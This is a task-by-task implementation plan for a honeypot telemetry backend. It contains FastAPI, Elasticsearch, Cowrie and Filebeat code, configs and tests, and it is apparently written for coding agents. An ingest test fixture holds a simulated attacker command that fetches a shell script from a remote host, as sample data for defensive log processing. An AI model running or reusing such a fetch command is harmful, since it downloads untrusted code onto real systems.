# Honeypot Analysis Backend (Phase 1) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build the Python/FastAPI backend that makes the existing React frontend's `DataProvider` contract real — ingesting Cowrie honeypot telemetry into Elasticsearch, analyzing attacker sessions with a hybrid rules+LLM pipeline, and persisting fully evidence-grounded results in Postgres.

**Architecture:** Monorepo (`frontend/`, `backend/`, `infra/`). Elasticsearch stores observed telemetry; Postgres stores derived analysis. Every derived claim carries foreign keys back to the Elasticsearch documents that justify it, enforced by a write barrier. Analysis runs as a background job over seven stages, each in its own LLM context, publishing progress over a WebSocket. MITRE mapping is deterministic-rules-first with LLM gap-fill.

**Tech Stack:** Python 3.12, FastAPI, SQLModel + Alembic, `elasticsearch-py` 8.x, Pydantic v2, pytest + pytest-asyncio, Docker Compose (Cowrie, Filebeat, Elasticsearch 8.x, Kibana, Postgres 16), Ollama on host (`llama3.1:8b`), BYOK cloud evaluator.

**Spec:** [`docs/superpowers/specs/2026-08-27-honeypot-analysis-backend-design.md`](../specs/2026-08-27-honeypot-analysis-backend-design.md)

---

## Execution Rules For This Plan

**NO GIT OPERATIONS.** The repository owner has explicitly forbidden `git init`, `git add`, and `git commit` until the project reaches a milestone they choose. The standard plan format ends each task with a commit; **this plan replaces every commit step with a Checkpoint step**. Do not run any git command. Do not create a repository. If you believe a commit is warranted, say so and stop — do not act.

**Every task ends with a Checkpoint:** run the full backend test suite, confirm the task's deliverable works, and report. That is the review gate.

---

## Global Constraints

Every task's requirements implicitly include this section. Values are copied verbatim from the spec.

- **Confidence is a 0–1 fraction** (`0.94`). **Risk score is 0–100** (`87`). Never mix these.
- **JSON is camelCase.** Python models are snake_case; serialization uses a Pydantic `alias_generator` producing camelCase, with `populate_by_name=True`. The frontend types in `frontend/src/types/` are the authority on field names.
- **`EvidenceRef.eventId` and `EvidenceRef.timestamp` are required**, not optional.
- **No derived claim is persisted with zero evidence rows.** Rejected claims are counted, never silently dropped.
- **Every LLM-proposed technique ID is validated against the pinned ATT&CK catalog.** Unknown ID = rejected.
- **Local model:** `llama3.1:8b`, temperature `0.3`, context 32k. Do not substitute without a measured benchmark.
- **One LLM context per pipeline stage.** Never merge stages into a single prompt.
- **Elasticsearch index `honeypot-events`**, explicit mapping, `dynamic: strict`. No dynamic field creation from attacker-controlled strings.
- **Attacker-controlled text is untrusted.** Never interpolate into a shell. In LLM prompts it must be fenced and labelled as untrusted data.
- **Cowrie must never be exposed to the public internet.** Bind to localhost only.
- **Python 3.12.** Type hints on every public function.

---

## File Structure

```
Hivemind/
  docker-compose.yml            root compose, references infra/
  infra/
    elasticsearch/
      index-template.json       honeypot-events explicit mapping
      pipelines/cowrie-ecs.json ingest pipeline: cowrie.* -> ECS
    filebeat/filebeat.yml
    cowrie/cowrie.cfg
  frontend/                     existing app, moved from repo root
  backend/
    pyproject.toml
    alembic.ini
    app/
      main.py            FastAPI app, CORS, lifespan, router mount
      config.py          pydantic-settings
      deps.py            DI providers
      serialization.py   camelCase base model
      db/
        models.py        SQLModel tables
        session.py       engine + session factory
        migrations/      alembic versions
      es/
        client.py        AsyncElasticsearch factory
        bootstrap.py     install index template + ingest pipeline
        queries.py       LogQuery -> ES DSL, session aggregations
      routers/
        status.py  logs.py  sessions.py  honeypots.py  dashboard.py
        analyze.py  analysis.py  mitre.py  intel.py  attackers.py
        reports.py  events.py
      services/
        session_builder.py
        compaction.py
        analyzer.py
        persistence.py   evidence write barrier
        intel.py
        profiles.py
        reports.py
        mitre/
          rulebook.yaml
          rules.py
          catalog.py
          mapper.py
        llm/
          base.py  ollama.py  byok.py  schemas.py
          prompts/classify.md  indicators.md  mitre_gapfill.md  recommend.md
      workers/queue.py
      ws/progress.py
      seed/
        corpus/*.json
        seeder.py
    tests/
```

---

### Task 1: Monorepo restructure and backend scaffold

**Files:**
- Move: everything currently at repo root except `docs/` into `frontend/`
- Create: `backend/pyproject.toml`, `backend/app/__init__.py`, `backend/app/config.py`, `backend/app/serialization.py`, `backend/app/main.py`, `backend/app/routers/__init__.py`, `backend/app/routers/status.py`
- Create: `backend/tests/__init__.py`, `backend/tests/conftest.py`, `backend/tests/test_status.py`

**Interfaces:**
- Consumes: nothing (first task)
- Produces:
  - `app.config.Settings` — pydantic-settings class with fields `es_url: str`, `pg_dsn: str`, `ollama_host: str`, `ollama_model: str`, `byok_provider: str | None`, `byok_api_key: str | None`, `byok_model: str | None`, `cors_origins: list[str]`
  - `app.config.get_settings() -> Settings` (lru_cached)
  - `app.serialization.CamelModel` — Pydantic `BaseModel` subclass all API models inherit
  - `app.main.create_app() -> FastAPI`
  - `GET /api/status` returning `list[ServiceStatus]`

- [ ] **Step 1: Move the frontend into `frontend/`**

Run from repo root. `docs/` stays at root; everything else that is part of the app moves.

```bash
mkdir -p frontend
for item in src public node_modules .tanstack package.json package-lock.json tsconfig.json vite.config.ts eslint.config.js components.json bunfig.toml README.md .prettierrc .prettierignore .gitignore; do
  if [ -e "$item" ]; then mv "$item" frontend/; fi
done
ls frontend
```

Expected: `frontend/` now contains `src`, `package.json`, `vite.config.ts`, etc. Repo root contains only `docs/` and `frontend/`.

- [ ] **Step 2: Verify the frontend still builds after the move**

```bash
cd frontend && npm run build
```

Expected: build succeeds. Vite config uses relative paths, so no edits should be needed. If the build fails on a path, fix that path now — do not proceed with a broken frontend.

- [ ] **Step 3: Create `backend/pyproject.toml`**

```toml
[project]
name = "hivemind-backend"
version = "0.1.0"
requires-python = ">=3.12"
dependencies = [
    "fastapi>=0.115",
    "uvicorn[standard]>=0.32",
    "pydantic>=2.9",
    "pydantic-settings>=2.6",
    "elasticsearch>=8.15,<9",
    "sqlmodel>=0.0.22",
    "asyncpg>=0.30",
    "alembic>=1.14",
    "httpx>=0.27",
    "pyyaml>=6.0",
    "websockets>=13.0",
]

[project.optional-dependencies]
dev = [
    "pytest>=8.3",
    "pytest-asyncio>=0.24",
    "ruff>=0.7",
]

[tool.pytest.ini_options]
asyncio_mode = "auto"
testpaths = ["tests"]

[tool.ruff]
line-length = 100
target-version = "py312"
```

- [ ] **Step 4: Install the backend in editable mode**

```bash
cd backend && python -m venv .venv && .venv/Scripts/python -m pip install -e ".[dev]"
```

Expected: install completes. On non-Windows use `.venv/bin/python`. All later `pytest` / `uvicorn` commands in this plan assume this venv is active.

- [ ] **Step 5: Write the failing test for `/api/status`**

Create `backend/tests/test_status.py`:

```python
from fastapi.testclient import TestClient

from app.main import create_app


def test_status_returns_service_list() -> None:
    client = TestClient(create_app())
    response = client.get("/api/status")

    assert response.status_code == 200
    body = response.json()
    assert isinstance(body, list)

    ids = {item["id"] for item in body}
    assert {"elasticsearch", "postgres", "ollama"} <= ids

    for item in body:
        assert set(item) >= {"id", "name", "state"}
        assert item["state"] in {
            "connected",
            "degraded",
            "disconnected",
            "running",
            "unknown",
        }
```

- [ ] **Step 6: Run the test to verify it fails**

Run: `cd backend && pytest tests/test_status.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.main'`

- [ ] **Step 7: Write `backend/app/serialization.py`**

Every API model inherits this so responses match the frontend's camelCase types.

```python
from pydantic import BaseModel, ConfigDict


def to_camel(snake: str) -> str:
    head, *tail = snake.split("_")
    return head + "".join(word.capitalize() for word in tail)


class CamelModel(BaseModel):
    """Base for every model crossing the API boundary.

    Serializes snake_case Python fields as camelCase JSON to match the
    TypeScript types in frontend/src/types/.
    """

    model_config = ConfigDict(
        alias_generator=to_camel,
        populate_by_name=True,
        from_attributes=True,
    )
```

- [ ] **Step 8: Write `backend/app/config.py`**

```python
from functools import lru_cache

from pydantic_settings import BaseSettings, SettingsConfigDict


class Settings(BaseSettings):
    model_config = SettingsConfigDict(env_file=".env", extra="ignore")

    es_url: str = "http://localhost:9200"
    es_index: str = "honeypot-events"
    pg_dsn: str = "postgresql+asyncpg://hivemind:hivemind@localhost:5432/hivemind"

    ollama_host: str = "http://localhost:11434"
    ollama_model: str = "llama3.1:8b"
    ollama_temperature: float = 0.3

    byok_provider: str | None = None
    byok_api_key: str | None = None
    byok_model: str | None = None

    seed_output_head_lines: int = 20
    seed_output_tail_lines: int = 20

    cors_origins: list[str] = ["http://localhost:8080"]


@lru_cache
def get_settings() -> Settings:
    return Settings()
```

- [ ] **Step 9: Write `backend/app/routers/status.py`**

Real health probes come in Task 2 and Task 6. For now every dependency reports `unknown`, which is honest — the backend genuinely does not know yet.

```python
from fastapi import APIRouter

from app.config import get_settings
from app.serialization import CamelModel

router = APIRouter()


class ServiceStatus(CamelModel):
    id: str
    name: str
    state: str
    detail: str | None = None


@router.get("/status", response_model=list[ServiceStatus])
async def get_status() -> list[ServiceStatus]:
    settings = get_settings()
    evaluator_configured = settings.byok_api_key is not None
    return [
        ServiceStatus(id="elasticsearch", name="Elasticsearch", state="unknown"),
        ServiceStatus(id="postgres", name="Postgres", state="unknown"),
        ServiceStatus(
            id="ollama",
            name=f"Ollama ({settings.ollama_model})",
            state="unknown",
        ),
        ServiceStatus(
            id="evaluator",
            name="Cloud evaluator (BYOK)",
            state="connected" if evaluator_configured else "disconnected",
            detail=settings.byok_model if evaluator_configured else "no API key configured",
        ),
    ]
```

- [ ] **Step 10: Write `backend/app/main.py`**

```python
from fastapi import APIRouter, FastAPI
from fastapi.middleware.cors import CORSMiddleware

from app.config import get_settings
from app.routers import status


def create_app() -> FastAPI:
    settings = get_settings()
    app = FastAPI(title="Honeypot Intelligence Platform API", version="0.1.0")

    app.add_middleware(
        CORSMiddleware,
        allow_origins=settings.cors_origins,
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

    api = APIRouter(prefix="/api")
    api.include_router(status.router, tags=["status"])
    app.include_router(api)
    return app


app = create_app()
```

Create empty `backend/app/__init__.py` and `backend/app/routers/__init__.py`.

- [ ] **Step 11: Run the test to verify it passes**

Run: `cd backend && pytest tests/test_status.py -v`
Expected: PASS

- [ ] **Step 12: Verify the server runs**

```bash
cd backend && .venv/Scripts/python -m uvicorn app.main:app --port 8000
```

Expected: `curl http://localhost:8000/api/status` returns the four services as JSON. Stop the server afterward.

- [ ] **Step 13: Checkpoint**

Run: `cd backend && pytest -v`
Expected: all tests pass.

Confirm and report: frontend builds from `frontend/`, backend serves `/api/status`, repo root contains only `docs/`, `frontend/`, `backend/`. **Do not run any git command.**

---

### Task 2: Infrastructure — Elasticsearch, Kibana, Postgres

**Files:**
- Create: `docker-compose.yml` (repo root)
- Create: `backend/app/es/__init__.py`, `backend/app/es/client.py`
- Create: `backend/app/db/__init__.py`, `backend/app/db/session.py`
- Modify: `backend/app/routers/status.py` (replace `unknown` with real probes)
- Create: `backend/tests/test_health_probes.py`

**Interfaces:**
- Consumes: `app.config.get_settings`, `app.routers.status.ServiceStatus` (Task 1)
- Produces:
  - `app.es.client.get_es() -> AsyncElasticsearch` (cached singleton)
  - `app.es.client.es_health() -> tuple[str, str | None]` returning `(state, detail)`
  - `app.db.session.get_engine() -> AsyncEngine`
  - `app.db.session.pg_health() -> tuple[str, str | None]`

- [ ] **Step 1: Write `docker-compose.yml` at the repo root**

Security note: Elasticsearch security is disabled and all ports bind to `127.0.0.1` only. This is a local development stack. Do not deploy this file to a public host.

```yaml
services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.15.3
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false
      - ES_JAVA_OPTS=-Xms1g -Xmx1g
    ports:
      - "127.0.0.1:9200:9200"
    volumes:
      - es-data:/usr/share/elasticsearch/data
    healthcheck:
      test: ["CMD-SHELL", "curl -fs http://localhost:9200/_cluster/health || exit 1"]
      interval: 10s
      timeout: 5s
      retries: 12

  kibana:
    image: docker.elastic.co/kibana/kibana:8.15.3
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    ports:
      - "127.0.0.1:5601:5601"
    depends_on:
      elasticsearch:
        condition: service_healthy

  postgres:
    image: postgres:16-alpine
    environment:
      - POSTGRES_USER=hivemind
      - POSTGRES_PASSWORD=hivemind
      - POSTGRES_DB=hivemind
    ports:
      - "127.0.0.1:5432:5432"
    volumes:
      - pg-data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U hivemind"]
      interval: 10s
      timeout: 5s
      retries: 12

volumes:
  es-data:
  pg-data:
```

- [ ] **Step 2: Bring the stack up and confirm health**

```bash
docker compose up -d && docker compose ps
```

Expected: `elasticsearch` and `postgres` report `healthy`; `kibana` reports `running`. Kibana takes ~60s to become responsive at http://localhost:5601 — that is normal.

- [ ] **Step 3: Write the failing test for health probes**

Create `backend/tests/test_health_probes.py`. This is an integration test — it requires the compose stack from Step 2 to be running.

```python
import pytest

from app.db.session import pg_health
from app.es.client import es_health


@pytest.mark.asyncio
async def test_es_health_reports_connected() -> None:
    state, detail = await es_health()
    assert state == "connected"
    assert detail is not None


@pytest.mark.asyncio
async def test_pg_health_reports_connected() -> None:
    state, _ = await pg_health()
    assert state == "connected"
```

- [ ] **Step 4: Run the test to verify it fails**

Run: `cd backend && pytest tests/test_health_probes.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.es'`

- [ ] **Step 5: Write `backend/app/es/client.py`**

```python
from functools import lru_cache

from elasticsearch import AsyncElasticsearch

from app.config import get_settings


@lru_cache
def get_es() -> AsyncElasticsearch:
    return AsyncElasticsearch(get_settings().es_url, request_timeout=30)


async def es_health() -> tuple[str, str | None]:
    """Probe the cluster. Returns a (state, detail) pair for ServiceStatus."""
    try:
        health = await get_es().cluster.health()
    except Exception as exc:  # noqa: BLE001 - any failure means disconnected
        return "disconnected", str(exc)[:200]

    cluster_status = health.get("status", "unknown")
    state = "connected" if cluster_status in {"green", "yellow"} else "degraded"
    return state, f"cluster status: {cluster_status}"
```

- [ ] **Step 6: Write `backend/app/db/session.py`**

```python
from functools import lru_cache

from sqlalchemy import text
from sqlalchemy.ext.asyncio import AsyncEngine, async_sessionmaker, create_async_engine

from app.config import get_settings


@lru_cache
def get_engine() -> AsyncEngine:
    return create_async_engine(get_settings().pg_dsn, pool_pre_ping=True)


@lru_cache
def get_session_factory() -> async_sessionmaker:
    return async_sessionmaker(get_engine(), expire_on_commit=False)


async def pg_health() -> tuple[str, str | None]:
    """Probe Postgres. Returns a (state, detail) pair for ServiceStatus."""
    try:
        async with get_engine().connect() as conn:
            await conn.execute(text("SELECT 1"))
    except Exception as exc:  # noqa: BLE001
        return "disconnected", str(exc)[:200]
    return "connected", None
```

Create empty `backend/app/es/__init__.py` and `backend/app/db/__init__.py`.

- [ ] **Step 7: Run the test to verify it passes**

Run: `cd backend && pytest tests/test_health_probes.py -v`
Expected: PASS (both tests)

- [ ] **Step 8: Wire the real probes into `/api/status`**

Replace the body of `get_status` in `backend/app/routers/status.py`:

```python
import asyncio

from fastapi import APIRouter

from app.config import get_settings
from app.db.session import pg_health
from app.es.client import es_health
from app.serialization import CamelModel

router = APIRouter()


class ServiceStatus(CamelModel):
    id: str
    name: str
    state: str
    detail: str | None = None


@router.get("/status", response_model=list[ServiceStatus])
async def get_status() -> list[ServiceStatus]:
    settings = get_settings()
    (es_state, es_detail), (pg_state, pg_detail) = await asyncio.gather(
        es_health(), pg_health()
    )
    evaluator_configured = settings.byok_api_key is not None

    return [
        ServiceStatus(
            id="elasticsearch", name="Elasticsearch", state=es_state, detail=es_detail
        ),
        ServiceStatus(id="postgres", name="Postgres", state=pg_state, detail=pg_detail),
        ServiceStatus(
            id="ollama", name=f"Ollama ({settings.ollama_model})", state="unknown"
        ),
        ServiceStatus(
            id="evaluator",
            name="Cloud evaluator (BYOK)",
            state="connected" if evaluator_configured else "disconnected",
            detail=settings.byok_model if evaluator_configured else "no API key configured",
        ),
    ]
```

`ollama` stays `unknown` until Task 10 adds its client.

- [ ] **Step 9: Update the Task 1 status test to accept real states**

The existing `test_status_returns_service_list` already asserts only that `state` is in the allowed set, so it still passes. Run it to confirm:

Run: `cd backend && pytest tests/test_status.py -v`
Expected: PASS

- [ ] **Step 10: Checkpoint**

Run: `cd backend && pytest -v`
Expected: all tests pass.

Confirm and report: `docker compose ps` shows Elasticsearch and Postgres healthy, Kibana reachable at http://localhost:5601, and `/api/status` now reports `connected` for both. **Do not run any git command.**

---

### Task 3: Elasticsearch index template and Cowrie→ECS ingest pipeline

**Files:**
- Create: `infra/elasticsearch/index-template.json`
- Create: `infra/elasticsearch/pipelines/cowrie-ecs.json`
- Create: `backend/app/es/bootstrap.py`
- Modify: `backend/app/main.py` (add lifespan calling bootstrap)
- Create: `backend/tests/test_ingest_pipeline.py`

**Interfaces:**
- Consumes: `app.es.client.get_es` (Task 2), `app.config.get_settings` (Task 1)
- Produces:
  - `app.es.bootstrap.PIPELINE_ID: str` = `"cowrie-ecs"`
  - `app.es.bootstrap.install_index_template() -> None`
  - `app.es.bootstrap.install_ingest_pipeline() -> None`
  - `app.es.bootstrap.bootstrap_es() -> None` (calls both; idempotent)
  - Elasticsearch index `honeypot-events` with `dynamic: strict` mapping matching `frontend/src/types/event.ts`

- [ ] **Step 1: Write `infra/elasticsearch/index-template.json`**

`dynamic: strict` is deliberate — attacker-controlled strings must never create new fields. A document with an unmapped field is rejected loudly rather than silently exploding the mapping.

```json
{
  "index_patterns": ["honeypot-events*"],
  "template": {
    "settings": {
      "number_of_shards": 1,
      "number_of_replicas": 0,
      "index.default_pipeline": "cowrie-ecs"
    },
    "mappings": {
      "dynamic": "strict",
      "properties": {
        "@timestamp": { "type": "date" },
        "source": {
          "properties": {
            "ip": { "type": "ip" },
            "port": { "type": "integer" },
            "country": { "type": "keyword" }
          }
        },
        "destination": {
          "properties": {
            "ip": { "type": "ip" },
            "port": { "type": "integer" }
          }
        },
        "event": {
          "properties": {
            "action": { "type": "keyword" },
            "category": { "type": "keyword" },
            "outcome": { "type": "keyword" }
          }
        },
        "network": { "properties": { "protocol": { "type": "keyword" } } },
        "user": { "properties": { "name": { "type": "keyword" } } },
        "process": {
          "properties": {
            "command_line": {
              "type": "text",
              "fields": { "keyword": { "type": "keyword", "ignore_above": 1024 } }
            },
            "output": { "type": "text", "index": false }
          }
        },
        "honeypot": {
          "properties": {
            "id": { "type": "keyword" },
            "name": { "type": "keyword" }
          }
        },
        "session": { "properties": { "id": { "type": "keyword" } } },
        "risk": {
          "properties": {
            "score": { "type": "integer" },
            "level": { "type": "keyword" }
          }
        },
        "mitre": {
          "properties": {
            "technique_id": { "type": "keyword" },
            "tactic": { "type": "keyword" }
          }
        },
        "ai_classification": { "type": "keyword" },
        "labels": { "properties": { "seeded": { "type": "boolean" } } },
        "file": {
          "properties": {
            "name": { "type": "keyword" },
            "hash": { "properties": { "sha256": { "type": "keyword" } } },
            "size": { "type": "long" },
            "url": { "type": "keyword" }
          }
        },
        "credential": {
          "properties": {
            "username": { "type": "keyword" },
            "password": { "type": "keyword" }
          }
        }
      }
    }
  },
  "priority": 200
}
```

- [ ] **Step 2: Write `infra/elasticsearch/pipelines/cowrie-ecs.json`**

Maps Cowrie's native JSON onto the mapping above. `event.category` is derived from `eventid` with a script processor.

```json
{
  "description": "Map Cowrie honeypot JSON events onto the ECS-style honeypot-events mapping",
  "processors": [
    { "set": { "field": "network.protocol", "value": "ssh", "override": false } },
    { "rename": { "field": "src_ip", "target_field": "source.ip", "ignore_missing": true } },
    { "rename": { "field": "src_port", "target_field": "source.port", "ignore_missing": true } },
    { "rename": { "field": "dst_ip", "target_field": "destination.ip", "ignore_missing": true } },
    { "rename": { "field": "dst_port", "target_field": "destination.port", "ignore_missing": true } },
    { "rename": { "field": "session", "target_field": "session.id", "ignore_missing": true } },
    { "rename": { "field": "eventid", "target_field": "event.action", "ignore_missing": true } },
    { "rename": { "field": "input", "target_field": "process.command_line", "ignore_missing": true } },
    { "rename": { "field": "username", "target_field": "credential.username", "ignore_missing": true } },
    { "rename": { "field": "password", "target_field": "credential.password", "ignore_missing": true } },
    { "rename": { "field": "shasum", "target_field": "file.hash.sha256", "ignore_missing": true } },
    { "rename": { "field": "url", "target_field": "file.url", "ignore_missing": true } },
    { "rename": { "field": "outfile", "target_field": "file.name", "ignore_missing": true } },
    {
      "set": {
        "field": "user.name",
        "copy_from": "credential.username",
        "ignore_empty_value": true
      }
    },
    {
      "script": {
        "lang": "painless",
        "description": "Derive event.category and event.outcome from event.action",
        "source": "def a = ctx.event?.action; if (a == null) { return; } if (a.contains('session.connect') || a.contains('session.closed') || a.contains('client.')) { ctx.event.category = 'network'; } else if (a.contains('login.')) { ctx.event.category = 'authentication'; ctx.event.outcome = a.contains('success') ? 'success' : 'failure'; } else if (a.contains('command.')) { ctx.event.category = 'process'; ctx.event.outcome = a.contains('failed') ? 'failure' : 'success'; } else if (a.contains('file_download') || a.contains('file_upload')) { ctx.event.category = 'file'; } else { ctx.event.category = 'other'; }"
      }
    },
    {
      "date": {
        "field": "timestamp",
        "target_field": "@timestamp",
        "formats": ["ISO8601"],
        "ignore_failure": true
      }
    },
    { "remove": { "field": "timestamp", "ignore_missing": true } },
    {
      "remove": {
        "field": ["message", "sensor", "protocol", "system", "isError", "src_host", "duration", "ttylog", "arch", "kernel_version", "kernel_build_string", "hassh", "hasshAlgorithms", "version", "macCS", "encCS", "kexAlgs", "keyAlgs", "compCS", "langCS", "shasum_hex", "destfile", "shell", "input_hex"],
        "ignore_missing": true
      }
    }
  ],
  "on_failure": [
    {
      "set": {
        "field": "event.category",
        "value": "other"
      }
    }
  ]
}
```

The large `remove` list exists because the mapping is `dynamic: strict` — any Cowrie field not mapped and not removed causes the document to be rejected. If a new Cowrie field appears later, either map it or add it here.

- [ ] **Step 3: Write the failing test for the pipeline**

Create `backend/tests/test_ingest_pipeline.py`. It exercises the pipeline through Elasticsearch's `_simulate` API, so it tests the real JSON, not a Python reimplementation.

```python
import pytest

from app.es.bootstrap import PIPELINE_ID, bootstrap_es
from app.es.client import get_es

COWRIE_COMMAND_EVENT = {
    "eventid": "cowrie.command.input",
    "timestamp": "2026-08-20T10:15:03.421000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "src_port": 51234,
    "dst_port": 2222,
    "input": "wget http://198.51.100.7/x.sh",
    "message": "CMD: wget http://198.51.100.7/x.sh",
    "sensor": "cowrie-01",
}

COWRIE_LOGIN_EVENT = {
    "eventid": "cowrie.login.failed",
    "timestamp": "2026-08-20T10:14:58.100000Z",
    "session": "a1b2c3d4e5f6",
    "src_ip": "185.220.101.44",
    "username": "root",
    "password": "123456",
}


async def _simulate(doc: dict) -> dict:
    await bootstrap_es()
    result = await get_es().ingest.simulate(
        id=PIPELINE_ID, docs=[{"_source": doc}]
    )
    entry = result["docs"][0]
    assert "error" not in entry, entry
    return entry["doc"]["_source"]


@pytest.mark.asyncio
async def test_command_event_maps_to_ecs() -> None:
    src = await _simulate(COWRIE_COMMAND_EVENT)

    assert src["source"]["ip"] == "185.220.101.44"
    assert src["source"]["port"] == 51234
    assert src["destination"]["port"] == 2222
    assert src["session"]["id"] == "a1b2c3d4e5f6"
    assert src["event"]["action"] == "cowrie.command.input"
    assert src["event"]["category"] == "process"
    assert src["process"]["command_line"] == "wget http://198.51.100.7/x.sh"
    assert src["@timestamp"].startswith("2026-08-20T10:15:03")
    assert "message" not in src
    assert "sensor" not in src


@pytest.mark.asyncio
async def test_login_event_maps_to_authentication_failure() -> None:
    src = await _simulate(COWRIE_LOGIN_EVENT)

    assert src["event"]["category"] == "authentication"
    assert src["event"]["outcome"] == "failure"
    assert src["credential"]["username"] == "root"
    assert src["user"]["name"] == "root"
```

- [ ] **Step 4: Run the test to verify it fails**

Run: `cd backend && pytest tests/test_ingest_pipeline.py -v`
Expected: FAIL with `ModuleNotFoundError: No module named 'app.es.bootstrap'`

- [ ] **Step 5: Write `backend/app/es/bootstrap.py`**

```python
import json
from pathlib import Path

from app.config import get_settings
from app.es.client import get_es

PIPELINE_ID = "cowrie-ecs"
TEMPLATE_ID = "honeypot-events"

_INFRA = Path(__file__).resolve().parents[3].parent / "infra" / "elasticsearch"


def _load(relative: str) -> dict:
    return json.loads((_INFRA / relative).read_text(encoding="utf-8"))


async def install_ingest_pipeline() -> None:
    body = _load("pipelines/cowrie-ecs.json")
    await get_es().ingest.put_pipeline(
        id=PIPELINE_ID,
        description=body["description"],
        processors=body["processors"],
        on_failure=body.get("on_failure"),
    )


async def install_index_template() -> None:
    body = _load("index-template.json")
    await get_es().indices.put_index_template(
        name=TEMPLATE_ID,
        index_patterns=body["index_patterns"],
        template=body["template"],
        priority=body["priority"],
    )
    index = get_settings().es_index
    if not await get_es().indices.exists(index=index):
        await get_es().indices.create(index=index)


async def bootstrap_es() -> None:
    """Install the pipeline and template. Idempotent — safe on every startup."""
    await install_ingest_pipeline()
    await install_index_template()
```

Note the order: the pipeline must exist before the template, because the template sets `index.default_pipeline` referencing it.

- [ ] **Step 6: Verify `_INFRA` resolves correctly**

The path arithmetic is fragile. Confirm it before trusting it:

```bash
cd backend && .venv/Scripts/python -c "from app.es.bootstrap import _INFRA; print(_INFRA, _INFRA.exists())"
```

Expected: prints the absolute path to `Hivemind/infra/elasticsearch` and `True`. If it prints `False`, fix the `parents[N]` index — `__file__` is `backend/app/es/bootstrap.py`, so `parents[0]`=`es`, `[1]`=`app`, `[2]`=`backend`, and `.parent` of that is the repo root.

- [ ] **Step 7: Run the test to verify it passes**

Run: `cd backend && pytest tests/test_ingest_pipeline.py -v`
Expected: PASS (both tests)

- [ ] **Step 8: Call bootstrap on app startup**

Add a lifespan to `backend/app/main.py`:

```python
from contextlib import asynccontextmanager

from fastapi import APIRouter, FastAPI
from fastapi.middleware.cors import CORSMiddleware

from app.config import get_settings
from app.es.bootstrap import bootstrap_es
from app.routers import status


@asynccontextmanager
async def lifespan(app: FastAPI):
    await bootstrap_es()
    yield


def create_app() -> FastAPI:
    settings = get_settings()
    app = FastAPI(
        title="Honeypot Intelligence Platform API",
        version="0.1.0",
        lifespan=lifespan,
    )

    app.add_middleware(
        CORSMiddleware,
        allow_origins=settings.cors_origins,
        allow_credentials=True,
        allow_methods=["*"],
        allow_headers=["*"],
    )

    api = APIRouter(prefix="/api")
    api.include_router(status.router, tags=["status"])
    app.include_router(api)
    return app


app = create_app()
```

`TestClient` in `test_status.py` now triggers the lifespan, which requires Elasticsearch to be up. That is acceptable — the whole test suite from here on is integration-flavored and assumes the compose stack is running.

- [ ] **Step 9: Checkpoint**

Run: `cd backend && pytest -v`
Expected: all tests pass.

Verify the index exists with a strict mapping:

```bash
curl -s http://localhost:9200/honeypot-events/_mapping | head -20
```

Confirm and report: pipeline `cowrie-ecs` installed, index `honeypot-events` created with `dynamic: strict`, both mapping tests green. **Do not run any git command.**

---

### Task 4: Cowrie and Filebeat

**Files:**
- Create: `infra/cowrie/cowrie.cfg`
- Create: `infra/filebeat/filebeat.yml`
- Modify: `docker-compose.yml` (add `cowrie` and `filebeat` services)
- Create: `backend/tests/test_live_ingest.py`

**Interfaces:**
- Consumes: `app.es.bootstrap.bootstrap_es`, `app.config.get_settings`
- Produces: live Cowrie events landing in `honeypot-events`. No new Python symbols.

**Security:** Cowrie is intentionally attackable software. Both ports bind to `127.0.0.1`. It must not be reachable from outside this machine.

- [ ] **Step 1: Write `infra/cowrie/cowrie.cfg`**

```ini
[honeypot]
hostname = med-ws-04
log_path = var/log/cowrie
download_path = var/lib/cowrie/downloads
ttylog = false

[output_jsonlog]
enabled = true
logfile = ${honeypot:log_path}/cowrie.json

[output_textlog]
enabled = false

[ssh]
enabled = true
listen_endpoints = tcp:2222:interface=0.0.0.0

[telnet]
enabled = true
listen_endpoints = tcp:2223:interface=0.0.0.0
```

The hostname `med-ws-04` mimics a medical-sector Debian workstation, matching the context the paper used for its Cowrie evaluation. This matters for Phase 2, where the "context" realism category is judged against a declared intent.

- [ ] **Step 2: Write `infra/filebeat/filebeat.yml`**

```yaml
filebeat.inputs:
  - type: filestream
    id: cowrie-json
    enabled: true
    paths:
      - /cowrie-logs/cowrie.json
    parsers:
      - ndjson:
          target: ""
          overwrite_keys: true
          add_error_key: true

processors:
  - add_fields:
      target: honeypot
      fields:
        id: cowrie-01
        name: Cowrie SSH (med-ws-04)
  - add_fields:
      target: labels
      fields:
        seeded: false
  - drop_fields:
      fields: ["agent", "ecs", "host", "input", "log", "@metadata.beat"]
      ignore_missing: true

output.elasticsearch:
  hosts: ["http://elasticsearch:9200"]
  index: "honeypot-events"
  pipeline: "cowrie-ecs"

setup.template.enabled: false
setup.ilm.enabled: false
```

`setup.template.enabled: false` and `setup.ilm.enabled: false` are required — otherwise Filebeat installs its own template over ours and the strict mapping is lost.

The `drop_fields` entry lists `input` because Filebeat adds its own `input` metadata object, which would collide with Cowrie's `input` command field. The `ndjson` parser writes Cowrie's fields at the root first, then the processor drops Filebeat's object; verify in Step 5 that `process.command_line` survives.

- [ ] **Step 3: Add both services to `docker-compose.yml`**

Insert before the `volumes:` block:

```yaml
  cowrie:
    image: cowrie/cowrie:latest
    ports:
      - "127.0.0.1:2222:2222"
      - "127.0.0.1:2223:2223"
    volumes:
      - ./infra/cowrie/cowrie.cfg:/cowrie/cowrie-git/etc/cowrie.cfg:ro
      - cowrie-logs:/cowrie/cowrie-git/var/log/cowrie
    restart: unless-stopped

  filebeat:
    image: docker.elastic.co/beats/filebeat:8.15.3
    user: root
    command: ["--strict.perms=false"]
    volumes:
      - ./infra/filebeat/filebeat.yml:/usr/share/filebeat/filebeat.yml:ro
      - cowrie-logs:/cowrie-logs:ro
    depends_on:
      elasticsearch:
        condition: service_healthy
      cowrie:
        condition: service_started
```

And add `cowrie-logs:` to the `volumes:` block.

